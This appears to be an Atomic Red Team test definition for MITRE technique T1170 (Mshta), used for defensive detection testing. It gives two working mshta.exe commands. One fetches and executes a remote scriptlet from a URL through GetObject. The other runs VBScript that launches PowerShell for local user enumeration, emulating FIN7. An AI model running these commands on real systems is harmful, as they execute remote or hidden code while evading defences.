---
attack_technique: T1170
display_name: Mshta

atomic_tests:
- name: Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject
  description: |
    Test execution of a remote script using mshta.exe
  supported_platforms:
    - windows
  input_arguments:
    file_url:
      description: location of the payload
      type: Url
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/mshta.sct
  executor:
    name: command_prompt
    elevation_required: false
    command: |
      mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();

- name: Mshta executes VBScript to execute malicious code
  description: |
    Run a local VB script to run local user enumeration powershell command

    This attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.
  supported_platforms:
    - windows
  input_arguments:
    atomics_path:
      description: path to atomics folder
      type: path
      default: ..\..\atomics
  executor:
    name: command_prompt
    command: |
      mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -noexit -file #{atomics_path}\T1170\src\powershell.ps1"":close")
